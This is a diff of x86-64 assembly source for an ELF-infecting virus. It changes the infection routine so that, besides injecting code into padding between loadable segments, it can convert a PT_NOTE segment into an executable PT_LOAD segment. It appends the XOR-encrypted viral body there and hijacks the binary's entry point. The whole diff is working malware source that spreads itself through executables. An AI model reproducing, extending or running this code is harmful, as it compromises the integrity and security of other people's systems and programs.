@@ -732,7 +732,7 @@ _infect_file: ; (string rdi, stat rsi)
 	mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
 	push 3
 	pop rdx ; PROT_READ | PROT_WRITE
-	push 1
+	push MAP_SHARED
 	pop r10 ; MAP_SHARED
 	xor r9, r9
 	push SYSCALL_MMAP
@@ -763,14 +763,15 @@ _infect_file: ; (string rdi, stat rsi)
 
 	.is_elf_file:
 		; get pt_load exec
-		mov ax, [r13 + E_PHNUM]; e_phnum
-		mov rbx, r13
-		add rbx, [r13 + E_PHOFF]; e_phoff
 		xor rcx, rcx
+		.get_segment_exec:
+			mov ax, [r13 + E_PHNUM]; e_phnum
+			mov rbx, r13
+			add rbx, [r13 + E_PHOFF]; e_phoff
 		.find_segment_exec:
 			inc rcx
 			cmp rcx, rax
-			je .unmap
+			jge .get_segment_note
 			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
 			jne .next
 			mov dx, [rbx + P_FLAGS]; p_flags
@@ -779,21 +780,148 @@ _infect_file: ; (string rdi, stat rsi)
 			.next:
 				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
 			jmp .find_segment_exec
+; = test
+		.get_segment_note:
+			; get max vaddr
+			xor rsi, rsi; max
+			xor rcx, rcx
+			mov rbx, r13
+			add rbx, [r13 + E_PHOFF]; e_phoff
+			.find_max:
+				inc rcx
+				cmp rcx, rax
+				jge .found_max
+				mov rdx, [rbx + P_VADDR]
+				add rdx, [rbx + P_MEMSZ]
+				cmp rsi, rdx
+				jge .continue
+				push rdx
+				pop rsi
+				.continue:
+				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
+				jmp .find_max
+			.found_max:
+			xor rcx, rcx
+			mov rbx, r13
+			add rbx, [r13 + E_PHOFF]; e_phoff
+		.find_segment_note:
+			inc rcx
+			cmp rcx, rax
+			jge .unmap
+			cmp dword[rbx], PT_NOTE ; p_type != PT_NOTE
+			jne .nnext
+			; FOUND !
+			; map
+			push rsi
+			push r8
+			push r10
+			xor rdi, rdi
+			mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
+			; ADD VIRUS_SIZE
+			add rsi, r14; add virus size
+			push 3
+			pop rdx ; PROT_READ | PROT_WRITE
+			push 34
+			pop r10 ; MAP_PRIVATE | MAP_ANON
+			xor r9, r9
+			xor r8, r8
+			push r11
+			push SYSCALL_MMAP
+			pop rax ; mmap
+			syscall
+			pop r11
+			pop r10
+			pop r8
+
+			mov rdi, rax
+			mov rsi, r13
+			mov rdx, [r12 + ST_SIZE]
+			call _ft_memcpy
+			pop rsi
+
+			sub rbx, r13
+			push r13
+			push rax
+			pop r13
+			add rbx, r13
+			mov dword[rbx], PT_LOAD; PT_LOAD
+			mov dword[rbx + P_FLAGS], 5; PF_X | PF_R
+			mov rax, [r12 + ST_SIZE]
+			mov [rbx + P_OFFSET], rax
+			xor rdx, rdx
+			push 0x1000
+			pop rcx
+			div rcx
+			push rsi
+			pop rax
+			div rcx
+			inc rax
+			mul rcx
+			add rax, rdx
+
+			mov [rbx + P_VADDR], rax
+			mov [rbx + P_PADDR], rax
+			mov qword[rbx + P_FILESZ], 0x0
+			mov qword[rbx + P_MEMSZ], 0x0
+			mov qword[rbx + P_ALIGN], 0x1000
+
+			push r11
+
+			mov rdi, [r12 + ST_SIZE]
+			add rdi, r13 ; addr pointer -> mmap
+
+			mov rdx, r14
+
+			push 1
+			pop r11; mode PT_NOTE
+			call _infect
+	 		pop r11
+
+			; write file
+			mov rdi, r11
+			push r11
+			mov rsi, r13
+			mov rdx, [r12 + ST_SIZE] ; statbuf.st_size
+			add rdx, r14
+			push SYSCALL_WRITE
+			pop rax
+			syscall
+			pop r11
+
+			; unmap
+			push r11; munmap using r11 ?
+			push r13
+			pop rdi
+			mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
+			add rsi, r14
+			push SYSCALL_MUNMAP
+			pop rax; munmap
+			syscall
+			pop r11
+			
+			pop r13
+			jmp .unmap
+			.nnext:
+				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
+			jmp .find_segment_note
+;
 		.check_if_infected:
+			; TODO: check only at offset + filesz - virus_size
+			push rcx
 			lea rdx, [rel signature]
 			lea rcx, [rel fingerprint]
 			sub rcx, rdx
 			mov rdi, [rbx + P_OFFSET]; p_offset
 			add rdi, r13
 			mov rsi, [rbx + P_FILESZ]; p_filesz
-			cmp rsi, rcx
-			jl .unmap
-			call _ft_memmem ; TODO: Instead modify header and add sneaky special char -> ++ speed (maybe mem ?)
+;			cmp rsi, rcx
+;			jl .unmap
+			call _ft_memmem
+			pop rcx
 			cmp rax, 0x0
 			jne .unmap
 
 			; check size needed
-			sub rdi, r13
 			mov rdi, [rbx + P_OFFSET]
 			add rdi, rsi; p_offset + p_filesz
 			mov rsi, [rbx + SIZEOF(ELF64_PHDR) + P_OFFSET] ; next->p_offset
@@ -802,102 +930,14 @@ _infect_file: ; (string rdi, stat rsi)
 			add rdi, r13 ; addr pointer -> mmap
 
 			xor r9, r9
+			cmp rsi, r14
+			jl .get_segment_exec ; if size between PT_LOAD isn't enough, search another segment
 			mov rdx, r14
-			cmp rsi, rdx
-			jl .unmap ; if size between PT_LOAD isn't enough -> abort
 
-			push rcx
-			; => Change fingerprint (r8 + fingerprint - _start)
-				push rdi
-				push rdx
-				inc r15
-				lea rsi, [rel fingerprint + 9]
-				lea rdi, [rel _start]
-				sub rsi, rdi
-				mov rdi, r8
-				add rdi, rsi
-				mov rsi, r15
-				lea rax, [rel hex_nums]
-
-				push 12
-				pop rcx
-				.remove_leading_zero:
-					rol rsi, 4
-					dec rcx
-					jnz .remove_leading_zero
-				push 4
-				pop rcx
-				.digit_loop:
-					rol rsi, 4
-					mov rdx, rsi
-					and rdx, 0x0f
-					movzx rdx, byte[rax + rdx]
-					mov byte[rdi], dl
-					inc rdi
-					dec rcx
-					jnz .digit_loop
-				pop rdx
-				pop rdi
-
-;				lea rsi, [rel fingerprint]
-;				lea rcx, [rel _start]
-;				sub rsi, rcx
-;				mov rcx, r8
-;				add rcx, rsi
-;				inc byte[rcx]
-			;
-			push 8 * 3
-			pop rcx
-
-			sub rdx, rcx
-			; copy virus
-			add rdi, rcx
-			mov rsi, r8
-			call _ft_memcpy
-			mov rax, rdi
-			add rdx, rcx
-			sub rax, rcx
-
-			push rdi
-			mov rdi, rax
-			push rax
-			lea rcx, [rel _virus]
-			lea rsi, [rel _params]
-			sub rcx, rsi
-			add rdi, rcx
-			mov rsi, rdx; [rel length]
-			push rdx
-			sub rsi, rcx ; length - (_virus - _params)
-			lea rdx, [rel _h3ll0w0rld]
-			mov rcx, KEY_SIZE
-			call _xor_encrypt
-			pop rdx
-			pop rax
-			pop rdi
-			pop rcx
-
-			; add _params
-			mov [rax], rdx ; length
-			add rax, 8
-			sub rdi, r13
-			; copy mapped 'padding' like 0x400000
-			mov rsi, rdi
-			add rsi, [rbx + P_VADDR]; p_vaddr
-			sub rsi, [rbx + P_OFFSET]; p_offset
-			mov [rax], rsi ; entry_inject
-			add rax, 8
-			mov rsi, [r13 + E_ENTRY]; entry_prg
-			mov [rax], rsi
-
-			; change entry
-			; copy mapped 'padding' like 0x400000
-			add rdi, [rbx + P_VADDR]; vaddr
-			sub rdi, [rbx + P_OFFSET]; p_offset
-			mov [r13 + E_ENTRY], rdi ; new_entry
-
-			; change pt_load size
-			add [rbx + P_FILESZ], rdx; p_filesz + virus
-			add [rbx + P_MEMSZ], rdx; p_memsz + virus
+			push r11
+			xor r11, r11; mode PT_LOAD
+			call _infect
+			pop r11
 
 	.unmap:
 		push r11; munmap using r11 ?
@@ -927,6 +967,101 @@ _infect_file: ; (string rdi, stat rsi)
 	pop r12
 	pop r11
 	pop r10
+ret
+
+_infect:
+	push rcx
+	; => Change fingerprint (r8 + fingerprint - _start)
+		push rdi
+		push rdx
+		inc r15
+		lea rsi, [rel fingerprint + 9]
+		lea rdi, [rel _start]
+		sub rsi, rdi
+		mov rdi, r8
+		add rdi, rsi
+		mov rsi, r15
+		lea rax, [rel hex_nums]
+
+		push 12
+		pop rcx
+		.remove_leading_zero:
+			rol rsi, 4
+			dec rcx
+			jnz .remove_leading_zero
+		push 4
+		pop rcx
+		.digit_loop:
+			rol rsi, 4
+			mov rdx, rsi
+			and rdx, 0x0f
+			movzx rdx, byte[rax + rdx]
+			mov byte[rdi], dl
+			inc rdi
+			dec rcx
+			jnz .digit_loop
+		pop rdx
+		pop rdi
+
+;				lea rsi, [rel fingerprint]
+;				lea rcx, [rel _start]
+;				sub rsi, rcx
+;				mov rcx, r8
+;				add rcx, rsi
+;				inc byte[rcx]
+	;
+	push 8 * 3
+	pop rcx
+
+	sub rdx, rcx
+	; copy virus
+	add rdi, rcx
+	mov rsi, r8
+	call _ft_memcpy
+	mov rax, rdi
+	add rdx, rcx
+	sub rax, rcx
+
+	push rdi
+	mov rdi, rax
+	push rax
+	lea rcx, [rel _virus]
+	lea rsi, [rel _params]
+	sub rcx, rsi
+	add rdi, rcx
+	mov rsi, rdx; [rel length]
+	push rdx
+	sub rsi, rcx ; length - (_virus - _params)
+	lea rdx, [rel _h3ll0w0rld]
+	mov rcx, KEY_SIZE
+	call _xor_encrypt
+	pop rdx
+	pop rax
+	pop rdi
+	pop rcx
+
+	; add _params
+	mov [rax], rdx ; length
+	add rax, 8
+	sub rdi, r13
+	; copy mapped 'padding' like 0x400000
+	mov rsi, rdi
+	add rsi, [rbx + P_VADDR]; p_vaddr
+	sub rsi, [rbx + P_OFFSET]; p_offset
+	mov [rax], rsi ; entry_inject
+	add rax, 8
+	mov rsi, [r13 + E_ENTRY]; entry_prg
+	mov [rax], rsi
+
+	; change entry
+	; copy mapped 'padding' like 0x400000
+	add rdi, [rbx + P_VADDR]; vaddr
+	sub rdi, [rbx + P_OFFSET]; p_offset
+	mov [r13 + E_ENTRY], rdi ; new_entry
+
+	; change pt_load size
+	add [rbx + P_FILESZ], rdx; p_filesz + virus
+	add [rbx + P_MEMSZ], rdx; p_memsz + virus
 ret
 
 _check_file_process:; (string rdi)
